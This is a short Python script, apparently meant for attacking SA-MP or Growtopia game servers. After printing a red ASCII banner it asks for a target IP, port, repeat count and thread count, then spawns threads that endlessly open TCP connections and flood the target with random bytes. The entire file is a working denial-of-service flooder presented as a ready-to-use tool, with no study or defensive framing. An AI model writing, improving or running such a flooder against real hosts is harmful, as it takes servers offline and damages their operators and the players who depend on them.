import random
import socket
import threading

print("""\u001b[31m
╔══╗╔═╗╔═╗╔═╗╔═╗╔╗─╔╗╔══╗╔═══╗
╚╣─╝║║╚╝║║╚╗╚╝╔╝║║─║║╚╣─╝║╔══╝
─║║─║╔╗╔╗║─╚╗╔╝─║║─║║─║║─║╚══╗
─║║─║║║║║║─╔╝╚╗─║║─║║─║║─║╔══╝
╔╣─╗║║║║║║╔╝╔╗╚╗║╚═╝║╔╣─╗║║───
╚══╝╚╝╚╝╚╝╚═╝╚═╝╚═══╝╚══╝╚╝───
>>>Simple Tool | Samp | Gtps 
""")


ip = str(input("Ip : "))
port = int(input("Port: "))
times = int(input ("Sent File : "))
threads = int(input("TimeOut : "))
print("Says GoodBye")

def wibu():
	data = random._urandom(1018)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print("Sent")
		except:
		    s.close()
		    print("Sent File To Ip and Port Connecting Easy Down!!!")
		    
for y in range(threads):
    th = threading.Thread(target = wibu)
    th.start()
